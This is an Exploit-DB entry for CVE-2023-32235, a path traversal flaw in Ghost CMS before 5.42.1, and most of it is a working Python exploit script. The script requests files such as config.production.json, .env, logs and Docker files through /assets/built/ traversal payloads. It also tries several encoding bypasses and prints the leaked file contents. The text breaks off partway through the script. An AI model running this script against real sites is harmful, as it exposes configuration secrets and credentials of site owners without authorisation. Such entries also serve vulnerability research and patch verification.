---
title: [webapps] Ghost CMS 5.42.1 - Path Traversal
url: https://www.exploit-db.com/exploits/52408
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:47:54.523723
---

# [webapps] Ghost CMS 5.42.1 - Path Traversal

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Ghost CMS 5.42.1 - Path Traversal

#### EDB-ID:

###### 52408

#### CVE:

###### [2023-32235](https://nvd.nist.gov/vuln/detail/CVE-2023-32235)

---

**EDB Verified:**

#### Author:

###### [İbrahimsql](/?author=12279)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
# Exploit Title: Ghost CMS 5.42.1 - Path Traversal
# Date: 2023-06-15
# Exploit Author:ibrahimsql (https://github.com/ibrahimsql)
# Vendor Homepage: https://ghost.org
# Software Link: https://github.com/TryGhost/Ghost
# Version: < 5.42.1
# Tested on: Kali Linux 2024.1 Windows 10, macOS Big Sur
# CVE: CVE-2023-32235
# Category: Web Application Security
# CVSS Score: 7.5 (High)
# Description:
# Ghost CMS before version 5.42.1 contains a path traversal vulnerability that allows
# remote attackers to read arbitrary files within the active theme's folder structure.
# The vulnerability exists in the /assets/built/ endpoint which improperly handles
# directory traversal sequences (../../) allowing unauthorized file access.
# This can lead to disclosure of sensitive configuration files, environment variables,
# and other critical application data.

# Impact:
# - Unauthorized file disclosure
# - Potential exposure of configuration files
# - Information gathering for further attacks
# - Possible credential harvesting

# Requirements: requests>=2.28.1
"""

import requests
import sys
import urllib.parse
from typing import Dict, List, Tuple, Optional

class ExploitResult:
    def __init__(self):
        self.success = False
        self.payload = ""
        self.response = ""
        self.status_code = 0
        self.description = "Ghost before 5.42.1 allows remote attackers to read arbitrary files within the active theme's folder via /assets/built/../..// directory traversal"
        self.severity = "High"

class PathTraversalExploit:
    def __init__(self, target_url: str, verbose: bool = True):
        self.target_url = target_url.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'Accept': '*/*',
            'Cache-Control': 'no-cache',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def exploit(self) -> ExploitResult:
        result = ExploitResult()

        #  path traversal payloads targeting Ghost CMS specific files
        payloads = [
            {"path": "../../package.json", "description": "Main package.json with dependencies", "sensitive": True},
            {"path": "../../../package.json", "description": "Root package.json", "sensitive": True},
            {"path": "../../config.production.json", "description": "Production configuration", "sensitive": True},
            {"path": "../../config.development.json", "description": "Development configuration", "sensitive": True},
            {"path": "../../.env", "description": "Environment variables", "sensitive": True},
            {"path": "../../../.env", "description": "Root environment file", "sensitive": True},
            {"path": "../../content/settings/routes.yaml", "description": "Routes configuration", "sensitive": False},
            {"path": "../../content/logs/ghost.log", "description": "Ghost application logs", "sensitive": False},
            {"path": "../../README.md", "description": "Documentation file", "sensitive": False},
            {"path": "../../yarn.lock", "description": "Yarn lock file", "sensitive": False},
            {"path": "../../package-lock.json", "description": "NPM lock file", "sensitive": False},
            {"path": "../../../Dockerfile", "description": "Docker configuration", "sensitive": False},
            {"path": "../../../docker-compose.yml", "description": "Docker compose file", "sensitive": False}
        ]

        for payload in payloads:
            target_url = f"{self.target_url}/assets/built/{payload['path']}"

            if self.verbose:
                print(f"[*] Testing path traversal: {payload['path']}")

            try:
                response = self.session.get(target_url, timeout=10)

                if response.status_code == 200 and len(response.text) > 0:
                    if self._detect_file_read_success(response.text, payload['path']):
                        result.success = True
                        result.payload = payload['path']
                        result.response = response.text
                        result.status_code = response.status_code

                        if payload['sensitive']:
                            result.severity = "Critical"

                        if self.verbose:
                            print(f"[+] Successfully exploited path traversal: {payload['path']}")
                            print(f"[+] File content preview: {response.text[:200]}")
                        return result

            except requests.RequestException as e:
                if self.verbose:
                    print(f"[-] Request failed for {payload['path']}: {e}")
                continue

        # If no direct file read, try alternative bypass techniques
        if not result.success:
            self._try_path_traversal_bypasses(result)

        return result

    def _try_path_traversal_bypasses(self, result: ExploitResult):
        """Try various bypass techniques for path traversal"""
        bypass_payloads = [
            "..%2f..%2fpackage.json",           # URL encoded
            "..%252f..%252fpackage.json",       # Double URL encoded
            "....//....//package.json",        # Double dot bypass
            "..\\\\..\\\\package.json",            # Windows style
            ".%2e/.%2e/package.json",           # Mixed encoding
            "..%c0%af..%c0%afpackage.json",     # UTF-8 overlong encoding
        ]

        for payload in bypass_payloads:
            target_url = f"{self.target_url}/assets/built/{payload}"

            try:
                response = self.session.get(target_url, timeout=10)

                if response.status_code == 200 and self._detect_file_read_success(response.text, payload):
                    result.success = True
                    result.payload = payload
                    result.response = response.text
                    result.status_code = response.status_code

                    if self.verbose:
                        print(f"[+] Path traversal successful using encoding bypass: {payload}")
                    break

            except requests.RequestException:
                continue

    def _detect_file_read_success(self, body: str, payload: str) -> bool:
        """Check if the response indicates successful file read"""
        # Check for common file content indicators
        file_indicators = {
            "package.json": ['"name"', '"version"', '"dependencies"', '"scripts"'],
            ".env": ["DATABASE_URL", "NODE_ENV", "GHOST_", "="],
            "config": ['"database"', '"server"', '"url"', '"mail"'],
            "routes.yaml": ["routes:", "collections:", "taxonomies:"],
            "ghost.log": ["INFO", "ERROR", "WARN", "Ghost"],
            "README": ["#", "##", "Ghost", "installation"],
            "Dockerfile": ["FROM", "RUN", "COPY", "EXPOSE"],
            "docker-compose": ["version:", "services:", "ghost...